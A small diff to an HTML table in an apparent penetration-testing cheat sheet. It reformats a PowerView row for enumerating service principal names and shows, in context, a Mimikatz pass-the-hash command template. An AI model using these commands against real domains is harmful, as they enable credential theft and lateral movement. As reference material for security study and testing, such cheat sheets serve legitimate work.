@@ -1199,8 +1199,8 @@ print(server<span style="color:#f92672">.</span>info)
 <td>powershell command to grab properties like SID, DNS hostname of a computer in a domain</td>
 </tr>
 <tr>
-<td>`Get-NetUser -SPN</td>
-<td>select serviceprincipalname `</td>
+<td><code>Get-NetUser -SPN | select serviceprincipalname</code></td>
+<td>PowerView, get user service accounts</td>
 </tr>
 <tr>
 <td><code>sekurlsa::pth /user:&lt;user&gt; /domain:&lt;domain&gt; /ntlm:&lt;hash&gt; /run:cmd.exe</code></td>
